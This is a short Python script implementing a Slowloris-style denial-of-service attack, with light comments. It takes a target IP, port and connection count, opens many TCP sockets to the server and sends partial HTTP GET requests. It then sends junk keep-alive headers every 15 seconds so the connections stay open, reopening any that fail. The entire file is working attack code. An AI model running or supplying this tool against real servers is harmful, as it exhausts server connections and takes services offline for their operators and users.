#!usr/bin/python

import socket, time, sys, random

#print("GET /?{} HTTP/1.1\r\n".format(random.randint(0,2000)).encode("utf-8"))

# check for arguments
if len(sys.argv) != 4:
    print("Arguments are <Target IP> <Target Port> <Connection Count>")
    sys.exit(1)

regular_headers = [
    "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Accept-language: en-US,en,q=0.5"
]

ip = sys.argv[1]
port = int(sys.argv[2])
socket_list = []
socket_count = int(sys.argv[3])

# creates a socket and stores it in the socket_list
def create_socket():
    # creates a socket that uses IPv4 and TCP protocols
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # sets the timeout
    sock.settimeout(5)

    # using our created socket, connect to the selected IP and port
    sock.connect((ip, port))

    # sends a get request
    sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,2000)).encode("utf-8"))
    # sends the headers
    for header in regular_headers:
        sock.send(bytes("{}\r\n".format(header).encode("utf-8")))
    socket_list.append(sock)

# creates the desired number of sockets
for _ in range(socket_count):
    create_socket()

# sends keep alive messages from each of the sockets to the server
while True:
    for s in socket_list:
        # send keep alive message. If it fails, remove the socket from the list and create a new one to replace it
        try:
            s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
        except socket.error:
            s.close()
            socket_list.remove(s)
            create_socket()
    # sleep 15 seconds, then repeat
    time.sleep(15)


